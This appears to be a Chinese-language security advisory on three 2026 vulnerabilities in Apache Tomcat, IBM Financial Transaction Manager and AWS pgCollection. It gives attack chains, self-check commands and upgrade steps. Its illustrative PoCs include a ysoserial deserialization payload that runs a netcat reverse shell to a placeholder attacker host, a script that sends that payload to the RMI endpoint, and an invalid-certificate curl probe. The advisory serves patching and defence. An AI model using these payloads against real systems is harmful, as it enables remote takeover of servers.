#  Apache Tomcat 认证绕过 · IBM FTM 远程代码执行 · AWS pgCollection 类型混淆  
 撅人   2026-09-27 16:00  
  
CVE 安全通报 | 2026-09-27 披露  
  
高危漏洞安全通报  
  
CVE-2026-86248 | CVSS 9.8  
CVE-2026-18490 | CVSS 8.8  
CVE-2026-96883 | CVSS 8.8  
  
1  
  
漏洞速览  
  
CVE-2026-86248 — Apache Tomcat 客户端证书认证绕过  
  
CVE 编号：  
CVE-2026-86248  
  
漏洞类型：  
身份验证绕过（CWE-287）  
  
影响产品：  
Apache Tomcat  
  
安全等级：  
CVSS 9.8（危急）  
  
披露时间：  
2026-09-23  
  
利用情况：  
未公开 PoC  
  
修复版本：  
11.0.26 / 10.1.60 / 9.0.122  
  
CVE-2026-18490 — IBM FTM Java 反序列化远程代码执行  
  
CVE 编号：  
CVE-2026-18490  
  
漏洞类型：  
不安全反序列化（CWE-502）  
  
影响产品：  
IBM Financial Transaction Manager  
  
安全等级：  
CVSS 8.8（高危）  
  
披露时间：  
2026-09-24  
  
利用情况：  
未公开 PoC  
  
修复版本：  
4.0.11.0  
  
CVE-2026-96883 — AWS pgCollection 类型混淆远程代码执行  
  
CVE 编号：  
CVE-2026-96883  
  
漏洞类型：  
类型混淆（CWE-843）  
  
影响产品：  
AWS pgCollection（PostgreSQL 扩展）  
  
安全等级：  
CVSS 8.8（高危）  
  
披露时间：  
2026-09-24  
  
利用情况：  
社区已分析报告  
  
修复版本：  
pgCollection 2.1.2+  
  
2  
  
漏洞概述  
  
本期通报涵盖 2026 年 9 月 23 日至 24 日披露的 3 个高危漏洞，涉及**中间件（Apache Tomcat）**  
、**金融中间件（IBM FTM）**  
和**数据库扩展（AWS pgCollection）**  
三大产品类别。最高 CVSS 评分达 **9.8**  
，攻击者可从认证绕过一路直达远程代码执行。  
  
CVE-2026-86248 影响全球大量部署的 Apache Tomcat 服务器。当配置客户端证书认证且关闭 soft fail 模式时，攻击者可直接绕过认证访问受保护资源——这是中间件领域的经典攻击路径。  
  
CVE-2026-18490 涉及 IBM 金融交易管理器的 Java 反序列化缺陷，相邻网络攻击者无需认证即可执行任意代码，直接威胁金融交易系统的完整性。  
  
CVE-2026-96883 则是 PostgreSQL 数据库扩展中的类型混淆漏洞，认证用户可通过精心构造的 SQL 语句以 postgres 系统用户身份执行任意代码——数据库管理员需要重点关注。  
  
三个漏洞均处于可利用但未公开 PoC 的阶段（CVE-2026-96883 已有社区技术分析），建议各运维和安全团队立即评估自身环境并尽快升级。  
  
3  
  
详细漏洞分析  
  
3.1 CVE-2026-86248：Tomcat CLIENT_CERT 认证绕过  
  
**第一层：底层概念**  
 — Apache Tomcat 作为全球最流行的 Java Servlet 容器，支持多种认证方式。CLIENT_CERT 基于 X.509 客户端证书进行双向 TLS 认证，要求客户端提供有效证书才能建立安全会话。  
  
**第二层：漏洞机制**  
 — 当 SSL 配置文件禁用 soft fail（证书验证失败时必须拒绝连接）时，Tomcat 的 CLIENT_CERT 认证实现存在逻辑缺陷。即使客户端证书验证失败，服务器仍会创建安全主体（Security Principal），导致认证流程未能正确终止。  
  
**第三层：攻击链**  
  
步骤 1：攻击者向目标 Tomcat 发起 HTTPS 连接  
  
↓  
  
步骤 2：发送自签名或过期证书，触发证书验证失败  
  
↓  
  
步骤 3：由于 soft fail 配置缺陷，Tomcat 仍然创建 Security Principal  
  
↓  
  
步骤 4：攻击者绕过客户端证书认证，以授权身份访问受保护资源  
  
**利用条件：**  
服务器必须配置 CLIENT_CERT 认证，且 SSL 配置中 soft fail 为 false。攻击者无需任何凭据。  
  
PoC 概念验证（示意）：  
  
# 向配置了 CLIENT_CERT 认证的 Tomcat 发起连接 # 使用无效证书 curl -k --cert invalid_cert.pem --key invalid_key.pem \   https://target:8443/secure-resource  # 即使证书无效，由于漏洞存在，请求仍可能被处理  
  
3.2 CVE-2026-18490：IBM FTM Java 反序列化 RCE  
  
**第一层：底层概念**  
 — Java 原生反序列化是广泛使用的对象还原机制。如果反序列化过程中未对用户输入进行适当验证，攻击者可构造恶意序列化数据链，触发任意代码执行。  
  
**第二层：漏洞机制**  
 — IBM FTM 的 PayDir Business Rules Manager 在 RMI SSL 端点处理输入时，未对 Java 原生反序列化数据做正确清理。攻击者可构造恶意序列化负载，在反序列化过程中触发任意代码执行。  
  
**第三层：攻击链**  
  
步骤 1：攻击者在相邻网络构造恶意序列化数据  
  
↓  
  
步骤 2：将恶意数据发送至 PayDir 的 RMI SSL 端点  
  
↓  
  
步骤 3：FTM 端点反序列化恶意数据，触发 Gadget 链  
  
↓  
  
步骤 4：攻击者以 FTM 应用身份执行任意系统命令  
  
**利用条件：**  
攻击者需能访问 FTM 相邻网络，无需认证。攻击成功后可完全接管金融交易处理系统。  
  
PoC 概念验证（示意）：  
  
# 利用 ysoserial 生成恶意序列化负载 java -jar ysoserial.jar CommonsCollections5 \   "nc -e /bin/sh attacker.com 4444" > payload.ser  # 发送至 FTM RMI SSL 端点 python3 -c " import socket, ssl ctx = ssl.create_default_context() with socket.create_connection(('ftm-server', 1099)) as sock:     with ctx.wrap_socket(sock) as ssock:         ssock.send(open('payload.ser','rb').read()) "  
  
3.3 CVE-2026-96883：AWS pgCollection 类型混淆 RCE  
  
**第一层：底层概念**  
 — pgCollection 是 AWS 为 PostgreSQL 开发的开源扩展，提供类 MongoDB 的文档集合存储功能。PostgreSQL 类型系统严格区分不同数据类型，数据在 C 层和 SQL 层之间转换时需要正确的类型元数据匹配。  
  
**第二层：漏洞机制**  
 — pgCollection 2.0.0 至 2.1.1 版本中，当以与存储方式不兼容的类型请求集合值时，扩展会错误解释 datum 表示。类型转换函数与集合值检索函数之间的元数据不匹配导致类型混淆，攻击者可利用此缺陷触发后端进程崩溃或以 postgres 系统用户身份执行任意代码。  
  
**第三层：攻击链**  
  
步骤 1：认证用户使用 SQL 创建集合值（以特定类型存储）  
  
↓  
  
步骤 2：使用类型不兼容的方式请求同一个集合值  
  
↓  
  
步骤 3：pgCollection 类型转换逻辑错误解释 datum 内存布局  
  
↓  
  
步骤 4：利用类型混淆执行精心构造的 SQL 语句实现任意代码执行  
  
**利用条件：**  
需要 PostgreSQL 数据库认证凭据，以及 pgCollection 版本为 2.0.0 至 2.1.1。  
  
PoC 概念验证（示意）：  
  
-- 1. 创建集合值 SELECT set_icollection('mycol', 'test_key', '[1,2,3]'::jsonb);  -- 2. 以不兼容类型请求，触发类型混淆 SELECT get_icollection('mycol', 'test_key', 'text'::text);  -- 3. 利用类型混淆执行精心构造的 SQL 语句  
  
4  
  
快速自查命令  
  
以下为各漏洞的快速自查命令，建议安全团队在升级前先执行排查：  
  
自查 1：检查 Tomcat 版本（CVE-2026-86248）  
  
cat $CATALINA_HOME/bin/catalina.sh | grep -i "Apache Tomcat" curl -s https://target:8443/ 2>/dev/null | grep -i "tomcat"  
  
说明：确认版本是否落在 11.0.0-M14~11.0.25、10.1.22~10.1.59、9.0.92~9.0.121 范围内。  
  
自查 2：检查 Tomcat 认证配置  
  
grep -r "CLIENT_CERT" $CATALINA_HOME/conf/ grep -r "clientAuth" $CATALINA_HOME/conf/server.xml  
  
说明：如果找到 clientAuth="require" 配置，说明使用了客户端证书认证，存在受影响可能。  
  
自查 3：检查 IBM FTM 版本（CVE-2026-18490）  
  
oc get pods -A | grep -i ftm cat /opt/IBM/FTM/version.txt 2>/dev/null ss -tlnp | grep 1099  
  
说明：确认版本是否在 4.0.6.0~4.0.10.0 范围内，检查 RMI SSL 端点是否仅对可信网络开放。  
  
自查 4：检查 pgCollection 版本（CVE-2026-96883）  
  
psql -c "SELECT extname, extversion FROM pg_extension WHERE extname = 'pgcollection';"  
  
确认 pgCollection 版本是否在 2.0.0~2.1.1 范围内。  
  
5  
  
修复方案  
  
以下为各漏洞的版本对照表和升级步骤：  
  
CVE-2026-86248 — Apache Tomcat  
  
11.0.0-M14 ~ 11.0.25   
→**11.0.26**  
  
10.1.0-M1 ~ 10.1.59   
→**10.1.60**  
  
9.0.92 ~ 9.0.121   
→**9.0.122**  
  
# 1. 备份当前配置 cp -rp $CATALINA_HOME $CATALINA_HOME.backup  # 2. 下载最新版本 wget https://archive.apache.org/dist/tomcat/tomcat-11/v11.0.26/bin/apache-tomcat-11.0.26.tar.gz  # 3. 解压并替换 tar xzf apache-tomcat-11.0.26.tar.gz mv apache-tomcat-11.0.26 $CATALINA_HOME  # 4. 重启 Tomcat $CATALINA_HOME/bin/shutdown.sh $CATALINA_HOME/bin/startup.sh  
  
CVE-2026-18490 — IBM Financial Transaction Manager  
  
4.0.6.0 ~ 4.0.10.0   
→**4.0.11.0**  
  
CVE-2026-96883 — AWS pgCollection  
  
pgCollection 2.0.0 ~ 2.1.1   
→**2.1.2+**  
  
# 1. 下载并安装新版 pgCollection wget https://github.com/aws/pgcollection/releases/download/v2.1.2/pgcollection-2.1.2.tar.gz tar xzf pgcollection-2.1.2.tar.gz cd pgcollection-2.1.2 make && sudo make install  # 2. 更新 PostgreSQL 扩展 psql -c "ALTER EXTENSION pgcollection UPDATE TO '2.1.2';"  # 3. 重启 PostgreSQL sudo systemctl restart postgresql  
  
6  
  
安全提醒  
  
**1. 优先级排序：**  
CVE-2026-86248 影响范围最广（全球大量 Tomcat 部署），应作为首要修复目标。建议在 **24 小时内**  
完成升级。  
  
**2. 网络隔离：**  
对于暂时无法升级的系统，建议实施网络隔离。特别是 IBM FTM 的 RMI 端点应仅对可信内部子网开放。  
  
**3. 监控告警：**  
在 SIEM 中配置告警规则，监控异常认证尝试、RMI 连接和 PostgreSQL 中的异常 SQL 查询模式。  
  
**4. WAF 防护：**  
对于 Tomcat 部署，可在 WAF 层面临时拦截异常客户端证书请求，作为升级前的临时缓解措施。  
  
**5. 定期扫描：**  
将 CVE-2026-86248、CVE-2026-18490、CVE-2026-96883 纳入常规漏洞扫描清单，持续跟踪修复状态。  
  
7  
  
参考链接  
  
**CVE-2026-86248：**  
  
https://www.cve.org/CVERecord?id=CVE-2026-86248  
  
https://nvd.nist.gov/vuln/detail/CVE-2026-86248  
  
https://tomcat.apache.org/security-11.html  
  
**CVE-2026-18490：**  
  
https://www.cve.org/CVERecord?id=CVE-2026-18490  
  
https://nvd.nist.gov/vuln/detail/CVE-2026-18490  
  
https://www.ibm.com/support/pages/node/7288641  
  
**CVE-2026-96883：**  
  
https://www.cve.org/CVERecord?id=CVE-2026-96883  
  
https://nvd.nist.gov/vuln/detail/CVE-2026-96883  
  
https://euvd.enisa.europa.eu/vulnerability/EUVD-2026-86406  
  
免责声明：本文档仅供参考，不构成任何安全建议的替代。漏洞信息基于公开数据整理，可能存在延迟或偏差。请在实际操作前验证厂商最新安全公告。本文作者和发布方不对使用本文档内容导致的任何直接或间接损失承担责任。修复操作请在测试环境中验证后再部署到生产环境。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/C2LH9pdiblyKiaq0ylL6VeXGicOdEyN1xahCeCJJWRKk8VEgsREoS54m3sUZgbm2b4eLvO0zibPLesDkbhAI6cnGaGibVh0CzVkpQu0hibEWyBVx4/640?wx_fmt=jpeg&from=appmsg "")  
  
